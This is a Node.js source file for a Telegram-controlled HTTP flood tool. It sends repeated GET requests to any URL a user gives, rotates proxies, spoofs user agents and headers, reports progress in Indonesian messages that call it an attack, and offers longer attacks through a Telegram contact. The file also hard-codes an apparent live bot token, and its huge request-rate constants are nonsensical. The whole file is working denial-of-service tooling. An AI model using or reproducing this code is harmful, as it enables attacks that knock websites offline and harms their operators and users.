const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const TelegramBot = require('node-telegram-bot-api');

// Telegram bot token from BotFather
const TELEGRAM_TOKEN = '7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0'; // Replace with your bot token
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const proxyF = "proxy.txt";
const uaLF = "ua.txt";
const userAgents = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n").map(line => line.trim());

const acceptHeader = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
];

const encodingHeader = ["gzip, deflate, br"];
const langHeader = ["en-US,en;q=0.9"];
const refers = ["https://www.google.com/", "https://www.bing.com/"];
const cplist = ["max-age=0", "no-cache"];

function readProxy() {
    try {
        const data = fs.readFileSync(proxyF, "utf8");
        return data.trim().split("\n").map((line) => line.trim()).filter(line => line);
    } catch (error) {
        console.error(`Failed to read proxy list: ${error}`);
        return [];
    }
}

function readUA() {
    try {
        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
        return data.map(line => line.trim()).filter(line => line);
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
}

function sanitizeUA(userAgent) {
    return userAgent.replace(/[^\x20-\x7E]/g, "");
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function sendReq(target, agent, userAgent, chatId) {
    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
    const headers = {
        "User-Agent": sanitizedUserAgent,
        Accept: randElement(acceptHeader),
        "Accept-Encoding": randElement(encodingHeader),
        "Accept-Language": randElement(langHeader),
        Referer: randElement(refers),
        "Cache-Control": randElement(cplist),
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        TE: "Trailers",
    };

    axios
        .get(target, { httpAgent: agent, headers: headers, timeout: 5000 })
        .then(() => {
            bot.sendMessage(chatId, `Permintaan berhasil dikirim ke ${target}!`);
        })
        .catch((error) => {
            if (error.response && error.response.status === 503) {
                bot.sendMessage(chatId, "Server merespons 503, melanjutkan...");
            } else if (error.response && error.response.status === 502) {
                bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
            } else {
                bot.sendMessage(chatId, `Error: ${error.message}`);
            }
        });
}

function sendReqs(targetUrl, chatId) {
    const proxies = readProxy();
    const userAgentsList = readUA();

    if (!userAgentsList.length) {
        bot.sendMessage(chatId, `Error: Daftar user-agent kosong atau file ${uaLF} tidak ditemukan!`);
        return;
    }

    const proxy = proxies.length ? randElement(proxies) : null;
    let agent = null;

    if (proxy) {
        const proxyParts = proxy.split(":");
        if (proxyParts.length < 2) {
            bot.sendMessage(chatId, `Error: Format proxy tidak valid: ${proxy}`);
            return;
        }
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
        bot.sendMessage(chatId, `Menggunakan proxy: ${proxyUrl}`);
    } else {
        bot.sendMessage(chatId, "Tidak ada proxy, mengirim permintaan tanpa proxy");
    }

    sendReq(targetUrl, agent, randElement(userAgentsList), chatId);
}

// Telegram bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> <durasi> untuk memulai serangan (contoh: /mulai https://example.com 100). Durasi maksimal 180 detik.");
});

bot.onText(/\/mulai\s+([^\s]+)\s+(\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    let url = match[1].trim();
    const duration = parseInt(match[2]); // Durasi dalam detik

    // Validasi durasi
    if (duration > 180) {
        bot.sendMessage(chatId, "Durasi maksimal adalah 180 detik. Untuk memperpanjang, hubungi @@RajaGtpsS.");
        return;
    }
    if (duration <= 0) {
        bot.sendMessage(chatId, "Durasi harus lebih dari 0 detik.");
        return;
    }

    // Tambahkan protokol jika tidak ada
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        url = `https://${url}`;
    }

    // Validasi URL
    try {
        new URL(url);
    } catch (error) {
        bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com 100");
        return;
    }

    bot.sendMessage(chatId, `🚀 Memulai serangan ke ${url} selama ${duration} detik... 🤣`);

    let continueAttack = true;
    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Dari kode asli
    const maxRequests = duration * requestsPerSecond; // Hitung berdasarkan durasi

    let requestCount = 0;

    const attack = () => {
        if (!continueAttack || requestCount >= maxRequests) return;
        requestCount++;
        sendReqs(url, chatId);
        setTimeout(attack, 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 / requestsPerSecond);
    };

    const numThreads = 100; // Kurangi untuk stabilitas
    for (let i = 0; i < numThreads; i++) {
        attack();
    }

    setTimeout(() => {
        continueAttack = false;
        bot.sendMessage(chatId, "Batas waktu serangan tercapai. Serangan dihentikan.");
    }, duration * 1000); // Durasi dalam milidetik
});

// Display startup message
console.log('\033[38;5;46m' +
`            
[ASCII art disingkat untuk kejelasan]
` + '\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m2.2\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46m{> Rizky blackhead <}\n' +
'\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Government Websites\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Education Websites\n───────────────────────────────────────────\x1b[0m');

console.log("Bot Telegram sedang berjalan...");